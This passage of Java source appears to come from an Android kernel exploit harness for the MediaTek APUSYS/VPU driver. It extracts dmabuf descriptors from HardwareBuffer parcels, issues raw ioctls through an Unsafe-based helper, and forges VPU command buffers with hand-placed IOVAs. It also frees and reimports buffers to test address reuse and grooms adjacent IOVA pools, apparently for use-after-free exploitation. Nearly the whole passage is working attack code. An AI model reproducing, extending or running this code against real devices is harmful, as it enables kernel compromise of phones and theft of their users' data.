                XRP_SETTINGS_LEN_WRAPPER, XRP_OUTPUT_HEADER_FLAG_DEFAULT,
                XrpSettingsShape.WRAPPER_ONE_DATA, dispatch,
                VPU_REQUEST_FLAGS_DEFAULT, false, XRP_OP_ANN_VERSION.opcode,
                null, null, null, null, null, null, null, size, null, null);
        }
    }

    private static android.media.ImageReader createRgbaImageReader(int width, int height) {
        long usage = android.hardware.HardwareBuffer.USAGE_CPU_READ_OFTEN
            | android.hardware.HardwareBuffer.USAGE_CPU_WRITE_OFTEN
            | android.hardware.HardwareBuffer.USAGE_GPU_SAMPLED_IMAGE;
        try {
            return android.media.ImageReader.newInstance(
                width, height, android.graphics.PixelFormat.RGBA_8888, 3, usage);
        } catch (Throwable t) {
            System.out.println("[-] ImageReader usage create failed, retrying default usage: "
                + shortThrowable(t));
            return android.media.ImageReader.newInstance(
                width, height, android.graphics.PixelFormat.RGBA_8888, 3);
        }
    }

    private static ReplacementImport createProfilerHardwareBuffer(int index,
                                                                  int importSize,
                                                                  int marker,
                                                                  String key)
            throws Exception {
        ReplacementImport buffer = new ReplacementImport(index);
        try {
            int dimension = rgbaSquareDimensionForImportSize(importSize);
            buffer.reader = createRgbaImageReader(dimension, dimension);
            buffer.writer = android.media.ImageWriter.newInstance(
                buffer.reader.getSurface(), 2);
            buffer.input = buffer.writer.dequeueInputImage();
            fillImageHeader(buffer.input, marker, key);
            buffer.writer.queueInputImage(buffer.input);
            buffer.input = null;
            buffer.output = acquireImage(buffer.reader);
            if (buffer.output == null) {
                throw new IllegalStateException(
                    "profiler ImageReader produced no image");
            }
            buffer.hb = buffer.output.getHardwareBuffer();
            if (buffer.hb == null) {
                throw new IllegalStateException(
                    "profiler HardwareBuffer is null");
            }
            buffer.dmaBufFd = extractHardwareBufferDmaBufFd(buffer.hb, key);
            if (buffer.dmaBufFd < 0) {
                throw new IllegalStateException(
                    "profiler dmabuf fd unavailable");
            }
            return buffer;
        } catch (Throwable t) {
            buffer.closeQuietly();
            throw t;
        }
    }

    private static ReplacementImport[] createProfilerHardwareBufferPool(
            int count, int importSize, String keyPrefix) throws Exception {
        ReplacementImport[] buffers = new ReplacementImport[count];
        try {
            for (int i = 0; i < count; i++) {
                buffers[i] = createProfilerHardwareBuffer(i, importSize,
                    REUSE_MARKER_BASE + i, keyPrefix + "_" + i);
            }
            return buffers;
        } catch (Throwable t) {
            closeProfilerBufferPool(buffers);
            throw t;
        }
    }

    private static int rgbaSquareDimensionForImportSize(int importSize) {
        int dimension = 32;
        while ((dimension * dimension * 4) < importSize) {
            dimension *= 2;
        }
        return dimension;
    }

    private static long importProfilerMem(int apusysFd,
                                          ReplacementImport buffer,
                                          long memDesc,
                                          int importSize,
                                          String label,
                                          boolean verbose)
            throws Exception {
        if (buffer == null || buffer.dmaBufFd < 0) {
            return -1;
        }
        DrmTrigger.zeroMem(memDesc, 0x38);
        DrmTrigger.unsafePutInt(memDesc + 0x0c, importSize);
        DrmTrigger.unsafePutInt(memDesc + 0x18, 0);
        DrmTrigger.unsafePutInt(memDesc + 0x20, buffer.dmaBufFd);
        long ret = DrmTrigger.rawIoctl(apusysFd, APUSYS_CMD_MEM_CREATE2,
            memDesc);
        if (verbose) {
            System.out.println("[*] " + label + " mem_create2 cmd=0x"
                + Long.toHexString(APUSYS_CMD_MEM_CREATE2)
                + " ret=" + retText(ret));
        }
        if (ret >= 0) {
            buffer.memDesc = memDesc;
            buffer.imported = true;
            buffer.iovaLow = DrmTrigger.unsafeGetInt(memDesc + 0x08);
            buffer.iovaSize = DrmTrigger.unsafeGetInt(memDesc + 0x0c);
            if (verbose) {
                dumpU32Words(label + "_desc", memDesc, 0x38);
            }
        }
        return ret;
    }

    private static long freeProfilerMem(int apusysFd,
                                        ReplacementImport buffer,
                                        long memDesc,
                                        String label,
                                        boolean verbose)
            throws Exception {
        if (buffer == null || !buffer.imported) {
            return 0;
        }
        long ret = DrmTrigger.rawIoctl(apusysFd, APUSYS_CMD_MEM_FREE_02,
            memDesc);
        if (verbose || ret < 0) {
            System.out.println("[*] " + label + " mem_free cmd=0x"
                + Long.toHexString(APUSYS_CMD_MEM_FREE_02)
                + " ret=" + retText(ret));
        }
        if (ret >= 0) {
            buffer.imported = false;
        }
        return ret;
    }

    private static void fillTwoCommandSharedSettings(ReplacementImport shared,
                                                     int sharedIova,
                                                     int sharedSize,
                                                     boolean anyCompleted)
            throws Exception {
        if (shared == null || shared.output == null) {
            return;
        }
        android.media.Image.Plane[] planes = shared.output.getPlanes();
        if (planes == null || planes.length == 0) {
            throw new IllegalStateException("shared image has no planes");
        }
        java.nio.ByteBuffer buf = planes[0].getBuffer();
        if (anyCompleted) {
            fillXrpSettingsBuffer(buf, sharedIova, sharedSize,
                XRP_OP_ANN_VERSION, XRP_CMD_FLAGS_SEND,
                XRP_OUTPUT_HEADER_FLAG_DEFAULT,
                XrpSettingsShape.WRAPPER_ONE_DATA, null, null);
        } else {
            fillXrpSettingsBuffer(buf, sharedIova, sharedSize,
                XRP_OP_ANN_VERSION, XRP_CMD_FLAGS_INITIAL,
                XRP_OUTPUT_HEADER_FLAG_DEFAULT,
                XrpSettingsShape.CURRENT, null, null);
        }
    }

    private static ReplacementImport createTwoCommandXrpCommandBuffer(
            int apusysFd, int index, long memDesc, int sharedIova,
            int sharedSize, boolean completedShape, String label)
            throws Exception {
        ReplacementImport cmd = new ReplacementImport(index);
        try {
            cmd.reader = createRgbaImageReader(64, 64);
            cmd.writer = android.media.ImageWriter.newInstance(
                cmd.reader.getSurface(), 2);
            cmd.input = cmd.writer.dequeueInputImage();
            if (completedShape) {
                fillRunCmdVpuXrpIova(cmd.input, "apu_lib_apunn",
                    "two_cmd_" + label + "_cmd" + index + "_completed",
                    sharedIova, sharedSize, true, XRP_OP_ANN_VERSION, true,
                    VPU_DESC_LIBVPU_SETTINGS5, XRP_CMD_FLAGS_SEND,
                    VPU_DESC_ORDER_CODE_OUTPUT, XRP_SETTINGS_LEN_WRAPPER,
                    XrpSettingsShape.WRAPPER_ONE_DATA,
                    VPU_REQUEST_FLAGS_DEFAULT, false, null, null, null,
                    null, null, null, null, null);
            } else {
                fillRunCmdVpuXrpIova(cmd.input, "apu_lib_apunn",
                    "two_cmd_" + label + "_cmd" + index + "_timeout",
                    sharedIova, sharedSize, true, XRP_OP_ANN_VERSION, false,
                    VPU_DESC_MINIMAL, XRP_CMD_FLAGS_INITIAL,
                    VPU_DESC_ORDER_CODE_OUTPUT, XRP_SETTINGS_LEN,
                    XrpSettingsShape.CURRENT, VPU_REQUEST_FLAGS_DEFAULT,
                    true, null, null, null, null, null, null, null, null);
            }
            cmd.writer.queueInputImage(cmd.input);
            cmd.input = null;
            cmd.output = acquireImage(cmd.reader);
            if (cmd.output == null) {
                throw new IllegalStateException(
                    "two-command ImageReader produced no image");
            }
            cmd.hb = cmd.output.getHardwareBuffer();
            if (cmd.hb == null) {
                throw new IllegalStateException(
                    "two-command HardwareBuffer is null");
            }
            cmd.dmaBufFd = extractHardwareBufferDmaBufFd(cmd.hb,
                "two_cmd_" + label + "_cmd" + index);
            long ret = importProfilerMem(apusysFd, cmd, memDesc, 0x4000,
                "two_cmd_" + label + "_cmd" + index, true);
            if (ret < 0) {
                throw new IllegalStateException(
                    "two-command cmd import failed ret=" + retText(ret));
            }
            dumpTwoCommandCommandBuffer("cmd" + index + "_before", cmd);
            return cmd;
        } catch (Throwable t) {
            cmd.closeQuietly();
            throw t;
        }
    }

    private static long submitRunCmdAsync(int apusysFd, long runCmd,
                                          int dmaBufFd, String label)
            throws Exception {
        DrmTrigger.zeroMem(runCmd, 0x18);
        DrmTrigger.unsafePutInt(runCmd + 0x08, dmaBufFd);
        DrmTrigger.unsafePutInt(runCmd + 0x10, 0x4000);
        dumpU32Words(label + "_run_arg_before_async", runCmd, 0x18);
        long ret = DrmTrigger.rawIoctl(apusysFd, APUSYS_CMD_RUN_ASYNC,
            runCmd);
        System.out.println("[*] " + label + "_run_async cmd=0x"
            + Long.toHexString(APUSYS_CMD_RUN_ASYNC)
            + " ret=" + retText(ret));
        dumpU32Words(label + "_run_arg_after_async", runCmd, 0x18);
        return ret;
    }

    private static void dumpTwoCommandSharedBuffer(String phase,
                                                   ReplacementImport shared,
                                                   int sharedIova) {
        if (shared == null || shared.output == null) {
            return;
        }
        try {
            android.media.Image.Plane[] planes = shared.output.getPlanes();
            if (planes == null || planes.length == 0) {
                return;
            }
            System.out.println("[*] two-command shared " + phase
                + " iova=0x" + Integer.toHexString(sharedIova));
            dumpXrpWindows("two_cmd_shared_" + phase,
                planes[0].getBuffer(), XRP_OP_ANN_VERSION);
        } catch (Throwable t) {
            System.out.println("[-] two-command shared " + phase
                + " dump failed: " + shortThrowable(t));
        }
    }

    private static void dumpTwoCommandCommandBuffer(String phase,
                                                   ReplacementImport cmd) {
        if (cmd == null || cmd.output == null) {
            return;
        }
        try {
            android.media.Image.Plane[] planes = cmd.output.getPlanes();
            if (planes == null || planes.length == 0) {
                return;
            }
            System.out.println("[*] two-command " + phase
                + " fd=" + cmd.dmaBufFd);
            dumpVpuCommandWindows("two_cmd_" + phase,
                planes[0].getBuffer());
        } catch (Throwable t) {
            System.out.println("[-] two-command " + phase
                + " dump failed: " + shortThrowable(t));
        }
    }

    private static void fillGapSharedSettings(ReplacementImport shared,
                                              int sharedIova,
                                              int sharedSize)
            throws Exception {
        if (shared == null || shared.output == null) {
            return;
        }
        android.media.Image.Plane[] planes = shared.output.getPlanes();
        if (planes == null || planes.length == 0) {
            throw new IllegalStateException("gap shared image has no planes");
        }
        fillXrpSettingsBuffer(planes[0].getBuffer(), sharedIova, sharedSize,
            XRP_OP_ANN_VERSION, XRP_CMD_FLAGS_SEND,
            XRP_OUTPUT_HEADER_FLAG_DEFAULT,
            XrpSettingsShape.WRAPPER_ONE_DATA, null, null);
    }

    private static void dumpGapSharedBuffer(String phase,
                                            ReplacementImport shared,
                                            int sharedIova) {
        if (shared == null || shared.output == null) {
            return;
        }
        try {
            android.media.Image.Plane[] planes = shared.output.getPlanes();
            if (planes == null || planes.length == 0) {
                return;
            }
            System.out.println("[*] gap shared " + phase
                + " iova=0x" + Integer.toHexString(sharedIova));
            dumpXrpWindows("gap_shared_" + phase,
                planes[0].getBuffer(), XRP_OP_ANN_VERSION);
        } catch (Throwable t) {
            System.out.println("[-] gap shared " + phase
                + " dump failed: " + shortThrowable(t));
        }
    }

    private static boolean replacementLooksLikeApunnCompletion(
            ReplacementImport replacement, XrpOpSpec xrpOp) {
        if (replacement == null || replacement.output == null) {
            return false;
        }
        try {
            android.media.Image.Plane[] planes = replacement.output.getPlanes();
            if (planes == null || planes.length == 0) {
                return false;
            }
            java.nio.ByteBuffer buf = planes[0].getBuffer();
            int settingsFlags = getU32LE(buf, XRP_SETTINGS_OFF);
            int output0 = getU32LE(buf, xrpOutputOff(xrpOp));
            int dataDesc0 = getU32LE(buf, xrpDataDescOff(xrpOp));
            return settingsFlags == 0x7 || output0 == -1 || dataDesc0 == 0x3;
        } catch (Throwable t) {
            System.out.println("[-] replacement completion check failed: "
                + shortThrowable(t));
            return false;
        }
    }

    private static void closeProfilerBuffersIfFresh(boolean precreate,
                                                    ReplacementImport original,
                                                    ReplacementImport[] replacements) {
        if (precreate) {
            return;
        }
        if (original != null) {
            original.closeQuietly();
        }
        if (replacements != null) {
            closeProfilerBufferPool(replacements);
        }
    }

    private static void closeProfilerBufferPool(ReplacementImport[] buffers) {
        for (int i = 0; buffers != null && i < buffers.length; i++) {
            if (buffers[i] != null) {
                buffers[i].closeQuietly();
                buffers[i] = null;
            }
        }
    }

    private static int findGapProfilerTarget(ReplacementImport[] pool,
                                             int importSize) {
        return findGapProfilerTarget(pool, importSize, "first");
    }

    private static int findGapProfilerTarget(ReplacementImport[] pool,
                                             int importSize,
                                             String targetMode) {
        int bestIndex = -1;
        long bestIova = 0;
        int bestRunLength = -1;
        for (int i = 0; pool != null && i < pool.length; i++) {
            if (pool[i] == null || !pool[i].imported) {
                continue;
            }
            if (findExactLowerNeighbor(pool, i, importSize) < 0) {
                continue;
            }
            long candidate = pool[i].iovaLow & 0xffffffffL;
            if ("upper".equals(targetMode)
                    && !hasExactIovaNeighbor(pool, i, importSize)) {
                continue;
            }
            if ("highest".equals(targetMode)) {
                if (bestIndex < 0 || candidate > bestIova) {
                    bestIndex = i;
                    bestIova = candidate;
                }
            } else if ("lowest".equals(targetMode)) {
                if (bestIndex < 0 || candidate < bestIova) {
                    bestIndex = i;
                    bestIova = candidate;
                }
            } else if ("longest".equals(targetMode)) {
                int runLength = contiguousIovaRunLength(pool, i, importSize);
                if (bestIndex < 0 || runLength > bestRunLength
                        || (runLength == bestRunLength
                        && candidate < bestIova)) {
                    bestIndex = i;
                    bestIova = candidate;
                    bestRunLength = runLength;
                }
            } else if ("upper".equals(targetMode)) {
                return i;
            } else {
                return i;
            }
        }
        return bestIndex;
    }

    private static int findExactLowerNeighbor(ReplacementImport[] pool,
                                              int targetIndex,
                                              int importSize) {
        if (pool == null || targetIndex < 0 || targetIndex >= pool.length
                || pool[targetIndex] == null || !pool[targetIndex].imported) {
            return -1;
        }
        long target = pool[targetIndex].iovaLow & 0xffffffffL;
        for (int i = 0; i < pool.length; i++) {
            if (i == targetIndex || pool[i] == null || !pool[i].imported) {
                continue;
            }
            long candidate = pool[i].iovaLow & 0xffffffffL;
            if (target - candidate == (importSize & 0xffffffffL)) {
                return i;
            }
        }
        return -1;
    }

    private static int findExactUpperNeighbor(ReplacementImport[] pool,
                                              int targetIndex,
                                              int importSize) {
        if (pool == null || targetIndex < 0 || targetIndex >= pool.length
                || pool[targetIndex] == null || !pool[targetIndex].imported) {
            return -1;
        }
        long target = pool[targetIndex].iovaLow & 0xffffffffL;
        for (int i = 0; i < pool.length; i++) {
            if (i == targetIndex || pool[i] == null || !pool[i].imported) {
                continue;
            }
            long candidate = pool[i].iovaLow & 0xffffffffL;
            if (candidate - target == (importSize & 0xffffffffL)) {
                return i;
            }
        }
        return -1;
    }

    private static int findUnrelatedImportedNeighbor(ReplacementImport[] pool,
                                                     int targetIndex,
                                                     int lowerIndex,
                                                     int importSize) {
        if (pool == null) {
            return -1;
        }
        long target = pool[targetIndex].iovaLow & 0xffffffffL;
        long lower = pool[lowerIndex].iovaLow & 0xffffffffL;
        long step = importSize & 0xffffffffL;
        for (int i = 0; i < pool.length; i++) {
            if (i == targetIndex || i == lowerIndex || pool[i] == null
                    || !pool[i].imported) {
                continue;
            }
            long candidate = pool[i].iovaLow & 0xffffffffL;
            if (absLong(candidate - target) == step
                    || absLong(candidate - lower) == step) {
                continue;
            }
            return i;
        }
        return -1;
    }

    private static boolean hasExactIovaNeighbor(ReplacementImport[] pool,
                                                int targetIndex,
                                                int signedImportSize) {
        if (pool == null || targetIndex < 0 || targetIndex >= pool.length
                || pool[targetIndex] == null || !pool[targetIndex].imported) {
            return false;
        }
        long target = pool[targetIndex].iovaLow & 0xffffffffL;
        long want = target + signedImportSize;
        for (int i = 0; i < pool.length; i++) {
            if (i == targetIndex || pool[i] == null || !pool[i].imported) {
                continue;
            }
            long candidate = pool[i].iovaLow & 0xffffffffL;
            if (candidate == want) {
                return true;
            }
        }
        return false;
    }

    private static int contiguousIovaRunLength(ReplacementImport[] pool,
                                               int targetIndex,
                                               int importSize) {
        if (pool == null || targetIndex < 0 || targetIndex >= pool.length
                || pool[targetIndex] == null || !pool[targetIndex].imported) {
            return 0;
        }
        int runLength = 1;
        long target = pool[targetIndex].iovaLow & 0xffffffffL;
        long step = importSize & 0xffffffffL;
        long probe = target - step;
        while (containsImportedIova(pool, probe)) {
            runLength++;
            probe -= step;
        }
        probe = target + step;
        while (containsImportedIova(pool, probe)) {
            runLength++;
            probe += step;
        }
        return runLength;
    }

    private static boolean containsImportedIova(ReplacementImport[] pool,
                                                long wantIova) {
        for (int i = 0; pool != null && i < pool.length; i++) {
            if (pool[i] == null || !pool[i].imported) {
                continue;
            }
            long candidate = pool[i].iovaLow & 0xffffffffL;
            if (candidate == wantIova) {
                return true;
            }
        }
        return false;
    }

    private static void appendIndex(StringBuilder sb, int index) {
        if (sb.length() > 0) {
            sb.append(",");
        }
        sb.append(index);
    }

    private static String indexListText(StringBuilder sb) {
        if (sb == null || sb.length() == 0) {
            return "[-]";
        }
        return "[" + sb.toString() + "]";
    }

    private static String nonZeroHistogram(int[] histogram) {
        StringBuilder sb = new StringBuilder();
        sb.append("[");
        boolean wrote = false;
        for (int i = 0; histogram != null && i < histogram.length; i++) {
            if (histogram[i] == 0) {
                continue;
            }
            if (wrote) {
                sb.append(",");
            }
            sb.append(i);
            sb.append(":");
            sb.append(histogram[i]);
            wrote = true;
        }
        if (!wrote) {
            sb.append("-");
        }
        sb.append("]");
        return sb.toString();
    }

    private static String profilerIovaList(ReplacementImport[] pool) {
        StringBuilder sb = new StringBuilder();
        sb.append("[");
        for (int i = 0; pool != null && i < pool.length; i++) {
            if (i > 0) {
                sb.append(",");
            }
            if (pool[i] == null || !pool[i].imported) {
                sb.append("-");
            } else {
                sb.append("0x");
                sb.append(Integer.toHexString(pool[i].iovaLow));
            }
        }
        sb.append("]");
        return sb.toString();
    }

    private static long unsignedDelta(int value, int base) {
        return (value & 0xffffffffL) - (base & 0xffffffffL);
    }

    private static long absLong(long value) {
        return value < 0 ? -value : value;
    }

    private static String signedHexDelta(long delta) {
        if (delta < 0) {
            return "-0x" + Long.toHexString(-delta);
        }
        return "0x" + Long.toHexString(delta);
    }

    private static ReplacementImport createReplacementImport(int apusysFd,
                                                             int index,
                                                             int originalIova,
                                                             int originalSize,
                                                             XrpOpSpec xrpOp)
            throws Exception {
        ReplacementImport replacement = new ReplacementImport(index);
        try {
            replacement.reader = createRgbaImageReader(64, 64);
            replacement.writer = android.media.ImageWriter.newInstance(
                replacement.reader.getSurface(), 2);
            replacement.input = replacement.writer.dequeueInputImage();
            fillImageHeader(replacement.input, REUSE_MARKER_BASE + index,
                "reuse_" + index);
            replacement.writer.queueInputImage(replacement.input);
            replacement.input = null;

            replacement.output = acquireImage(replacement.reader);
            if (replacement.output == null) {
                throw new IllegalStateException(
                    "replacement ImageReader produced no image");
            }
            replacement.hb = replacement.output.getHardwareBuffer();
            if (replacement.hb == null) {
                throw new IllegalStateException(
                    "replacement HardwareBuffer is null");
            }
            replacement.dmaBufFd = extractHardwareBufferDmaBufFd(
                replacement.hb, "reuse_" + index);
            if (replacement.dmaBufFd < 0) {
                throw new IllegalStateException(
                    "replacement dmabuf fd unavailable");
            }

            replacement.memDesc = DrmTrigger.sScratchBuf
                + OFF_MEM_REUSE_BASE + (index * OFF_MEM_REUSE_STRIDE);
            DrmTrigger.zeroMem(replacement.memDesc, 0x38);
            DrmTrigger.unsafePutInt(replacement.memDesc + 0x0c, originalSize);
            DrmTrigger.unsafePutInt(replacement.memDesc + 0x18, 0);
            DrmTrigger.unsafePutInt(replacement.memDesc + 0x20,
                replacement.dmaBufFd);
            long ret = DrmTrigger.rawIoctl(apusysFd, APUSYS_CMD_MEM_CREATE2,
                replacement.memDesc);
            System.out.println("[*] reuse_import[" + index + "] cmd=0x"
                + Long.toHexString(APUSYS_CMD_MEM_CREATE2)
                + " ret=" + retText(ret));
            if (ret < 0) {
                return replacement;
            }

            replacement.imported = true;
            replacement.iovaLow = DrmTrigger.unsafeGetInt(
                replacement.memDesc + 0x08);
            replacement.iovaSize = DrmTrigger.unsafeGetInt(
                replacement.memDesc + 0x0c);
            dumpU32Words("reuse_import_" + index + "_desc",
                replacement.memDesc, 0x38);
            System.out.println("[+] reuse_import[" + index + "] iova=0x"
                + Integer.toHexString(replacement.iovaLow)
                + " size=0x" + Integer.toHexString(replacement.iovaSize)
                + " same_as_freed="
                + (replacement.iovaLow == originalIova ? "1" : "0")
                + " delta=0x"
                + Integer.toHexString(replacement.iovaLow - originalIova));
            dumpReplacementImport("before_wait", replacement, originalIova,
                xrpOp);
            return replacement;
        } catch (Throwable t) {
            System.out.println("[-] reuse_import[" + index + "] failed: "
                + shortThrowable(t));
            replacement.closeQuietly();
            return replacement;
        }
    }

    private static int extractHardwareBufferDmaBufFd(
            android.hardware.HardwareBuffer hb, String label) throws Exception {
        android.os.Parcel parcel = android.os.Parcel.obtain();
        int dmaBufFd = -1;
        try {
            hb.writeToParcel(parcel, 0);
            parcel.setDataPosition(388);
            android.os.ParcelFileDescriptor pfd = parcel.readFileDescriptor();
            if (pfd != null) {
                dmaBufFd = pfd.getFd();
            }
        } finally {
            parcel.recycle();
        }
        System.out.println("[+] " + label + " dmabuf fd=" + dmaBufFd);
        return dmaBufFd;
    }

    private static void dumpReplacementImport(String phase,
                                              ReplacementImport replacement,
                                              int originalIova,
                                              XrpOpSpec xrpOp) {
        if (replacement == null || replacement.output == null) {
            return;
        }
        try {
            android.media.Image.Plane[] planes = replacement.output.getPlanes();
            if (planes == null || planes.length == 0) {
                System.out.println("[-] reuse_import[" + replacement.index
                    + "] " + phase + ": no image planes");
                return;
            }
            java.nio.ByteBuffer buf = planes[0].getBuffer();
            System.out.println("[*] reuse_import[" + replacement.index + "] "
                + phase + " iova=0x"
                + Integer.toHexString(replacement.iovaLow)
                + " same_as_freed="
                + (replacement.iovaLow == originalIova ? "1" : "0"));
            dumpByteBuffer("reuse_" + replacement.index + "_" + phase
                + "_header", buf, 0x80);
            dumpXrpWindows("reuse_" + replacement.index + "_" + phase, buf,
                xrpOp);
        } catch (Throwable t) {
            System.out.println("[-] reuse_import[" + replacement.index + "] "
                + phase + " dump failed: " + shortThrowable(t));
        }
    }

    private static void cleanupReplacementImport(int apusysFd,
                                                 ReplacementImport replacement,
                                                 boolean apusysFdClosed) {
        if (replacement == null) {
            return;
        }
        try {
            if (replacement.imported) {
                if (apusysFdClosed) {
                    System.out.println("[*] reuse_import[" + replacement.index
                        + "] cleanup skipped because APUSYS fd is closed");
                } else {
                    long ret = DrmTrigger.rawIoctl(apusysFd,
                        APUSYS_CMD_MEM_FREE_02, replacement.memDesc);
                    System.out.println("[*] reuse_import[" + replacement.index
                        + "] mem_free cmd=0x"
                        + Long.toHexString(APUSYS_CMD_MEM_FREE_02)
                        + " ret=" + retText(ret));
                    if (ret >= 0) {
                        replacement.imported = false;
                    }
                }
            }
        } catch (Throwable t) {
            System.out.println("[-] reuse_import[" + replacement.index
                + "] cleanup failed: " + shortThrowable(t));
        } finally {
            replacement.closeQuietly();
        }
    }

    private static void fillImageHeader(android.media.Image image, int firstU32)
            throws Exception {
        fillImageHeader(image, firstU32, null);
    }

    private static void fillImageHeader(android.media.Image image, int firstU32,
                                        String key) throws Exception {
        android.media.Image.Plane[] planes = image.getPlanes();
        if (planes == null || planes.length == 0) {
            throw new IllegalStateException("input image has no planes");
        }
        java.nio.ByteBuffer buffer = planes[0].getBuffer();
        int clearLen = buffer.capacity() < 0x1000 ? buffer.capacity() : 0x1000;
        for (int i = 0; i < clearLen; i++) {
            buffer.put(i, (byte) 0);
        }
        buffer.put(0, (byte) (firstU32 & 0xff));
        buffer.put(1, (byte) ((firstU32 >>> 8) & 0xff));
        buffer.put(2, (byte) ((firstU32 >>> 16) & 0xff));
        buffer.put(3, (byte) ((firstU32 >>> 24) & 0xff));
        int keyBytes = 0;
        if (key != null) {
            byte[] bytes = key.getBytes("US-ASCII");
            keyBytes = bytes.length < 0x1f ? bytes.length : 0x1f;
            for (int i = 0; i < keyBytes; i++) {
                buffer.put(4 + i, bytes[i]);
            }
        }
        image.setTimestamp(System.nanoTime());
        System.out.println("[+] input image payload: first_u32=0x"
            + Integer.toHexString(firstU32)
            + (key == null ? "" : " key_bytes=" + keyBytes)
            + " plane_count=" + planes.length
            + " cap=" + buffer.capacity()
            + " rowStride=" + planes[0].getRowStride()
            + " pixelStride=" + planes[0].getPixelStride());
    }

    private static void fillRunCmdVpuIova(android.media.Image image,
                                          String algoName,
                                          String label,
                                          int iovaAddr,
                                          int iovaSize) throws Exception {
        android.media.Image.Plane[] planes = image.getPlanes();
        if (planes == null || planes.length == 0) {
            throw new IllegalStateException("input image has no planes");
        }
        java.nio.ByteBuffer buffer = planes[0].getBuffer();
        int clearLen = buffer.capacity() < 0x2000 ? buffer.capacity() : 0x2000;
        for (int i = 0; i < clearLen; i++) {
            buffer.put(i, (byte) 0);
        }

        int codebufOffset = 0x60;
        int codebufSize = 0xb70;
        int totalNeeded = codebufOffset + codebufSize;
        if (buffer.capacity() < totalNeeded) {
            throw new IllegalStateException("input image too small: need 0x"
                + Integer.toHexString(totalNeeded) + " have "
                + buffer.capacity());
        }

        // APUSYS command header — same as fillRunCmdVpuExec
        putU64LE(buffer, 0x00, 0x3d2070ece309c231L);
        buffer.put(0x10, (byte) 1);       // version
        buffer.put(0x11, (byte) 0);       // priority
        putU64LE(buffer, 0x18, 0);        // flags
        putU32LE(buffer, 0x20, 1);        // num_sc
        putU32LE(buffer, 0x24, 0x5c);     // ofs_scr_list
        putU32LE(buffer, 0x28, 0x58);     // ofs_pdr_cnt_list
        putU32LE(buffer, 0x2c, 0x30);     // sc0 offset

        // Subcommand at 0x30 — normal VPU type
        int scOff = 0x30;
        putU32LE(buffer, scOff + 0x00, 0x03);  // type = normal VPU
        putU32LE(buffer, scOff + 0x20, codebufSize);     // cb_info_size
        putU32LE(buffer, scOff + 0x24, codebufOffset);   // ofs_cb_info
        putU32LE(buffer, 0x58, 0);        // pdr_cnt_list[0]
        putU32LE(buffer, 0x5c, 0);        // scr_list[0]

        // VPU request at codebufOffset (0x60): 0xb70 bytes
        int reqBase = codebufOffset;

        // +0x04: algo name
        byte[] nameBytes = algoName.getBytes("US-ASCII");
        int nameLen = nameBytes.length < 0x1f ? nameBytes.length : 0x1f;
        for (int i = 0; i < nameLen; i++) {
            buffer.put(reqBase + 0x04 + i, nameBytes[i]);
        }

        // +0x28: flags = 0 (walk vpu_execute, not vpu_execute_with_slot)
        // +0x35: buffer_count. libvpu::addBuffer() increments this byte and
        // vpu_req_check bounds it to < 0x21.
        buffer.put(reqBase + 0x35, (byte) 1);

        // libvpu::prepareSettBuf() writes setting length at request+0x38
        // and setting IOVA/MVA at request+0x40. The setting payload content
        // is still just the imported HardwareBuffer bytes in this probe.
        putU32LE(buffer, reqBase + 0x38, iovaSize);
        putU64LE(buffer, reqBase + 0x40, iovaAddr & 0xffffffffL);

        // libvpu::addBuffer() uses one 0x40-byte descriptor per buffer at
        // request+0x50. For each plane, mmapMVA() normally fills +0x68 with
        // the imported MVA. Because this probe bypasses libvpu, place the
        // already returned APUSYS IOVA directly in plane0_mva.
        int buf0 = reqBase + 0x50;
        buffer.put(buf0 + 0x00, (byte) 0);      // port id / buffer tag
        buffer.put(buf0 + 0x01, (byte) 0);      // buffer kind/direction
        buffer.put(buf0 + 0x02, (byte) 1);      // plane_count
        putU32LE(buffer, buf0 + 0x04, iovaSize);
        putU32LE(buffer, buf0 + 0x08, 0);
        putU32LE(buffer, buf0 + 0x10, 0);       // plane0 offset/ptr low
        putU32LE(buffer, buf0 + 0x14, iovaSize);
        putU64LE(buffer, buf0 + 0x18, iovaAddr & 0xffffffffL);

        image.setTimestamp(System.nanoTime());
        System.out.println("[+] input run_cmd " + label + " payload:"
            + " magic=0x3d2070ece309c231 version=1 num_sc=1"
            + " sc0_off=0x30 sc0_type=0x3"
            + " cb_info_size=0x" + Integer.toHexString(codebufSize)
            + " cb_info_off=0x" + Integer.toHexString(codebufOffset)
            + " algo=" + algoName
            + " req_buffer_count=1"
            + " iova=0x" + Integer.toHexString(iovaAddr)
            + " iova_size=0x" + Integer.toHexString(iovaSize)
            + " setting_len_at=0x" + Integer.toHexString(reqBase + 0x38)
            + " setting_iova_at=0x" + Integer.toHexString(reqBase + 0x40)
            + " plane0_mva_at=0x" + Integer.toHexString(buf0 + 0x18)
            + " plane_count=" + planes.length
            + " cap=" + buffer.capacity()
            + " rowStride=" + planes[0].getRowStride()
            + " pixelStride=" + planes[0].getPixelStride());
    }

    private static void fillRunCmdVpuXrpIova(android.media.Image image,
                                             String algoName,
                                             String label,
                                             int iovaAddr,
                                             int iovaSize,
                                             boolean splitTargets,
                                             XrpOpSpec xrpOp,
                                             boolean twoVpuBuffers,
                                             int descriptorMode,
                                             int cmdFlags,
                                             int descriptorOrder,
                                             int settingsLen,
                                             XrpSettingsShape settingsShape,
                                             int requestFlags,
                                             boolean includeSettingsProperty,
                                             Integer descriptorPayloadSizeOverride,
                                             Integer requestPriorityOverride,
                                             Integer requestBufferCountOverride,
                                             Integer descriptorPortIdOverride,
                                             Integer descriptorFormatOverride,
                                             Integer descriptorPlaneCountOverride,
                                             Integer descriptorHeightOverride,
                                             Integer outerCodebufSizeOverride)
            throws Exception {
        android.media.Image.Plane[] planes = image.getPlanes();
        if (planes == null || planes.length == 0) {
            throw new IllegalStateException("input image has no planes");
        }
        java.nio.ByteBuffer buffer = planes[0].getBuffer();
        int clearLen = buffer.capacity() < 0x2000 ? buffer.capacity() : 0x2000;
        for (int i = 0; i < clearLen; i++) {
            buffer.put(i, (byte) 0);
        }

        int dataPayloadOff = xrpDataPayloadOff(xrpOp);
        int planePayloadOff = splitTargets
            ? xrpPlanePayloadOff(xrpOp) : dataPayloadOff;
        int requiredIovaBytes = planePayloadOff + XRP_PLANE_PAYLOAD_SIZE;
        if (iovaSize < requiredIovaBytes) {
            throw new IllegalStateException("imported IOVA too small: need 0x"
                + Integer.toHexString(requiredIovaBytes) + " have 0x"
                + Integer.toHexString(iovaSize));
        }

        int codebufOffset = 0x60;
        int requestFootprint = 0xb70;
        int codebufSize = outerCodebufSizeOverride != null
            ? outerCodebufSizeOverride : requestFootprint;
        int totalNeeded = codebufOffset
            + (codebufSize > requestFootprint ? codebufSize : requestFootprint);
        if (buffer.capacity() < totalNeeded) {
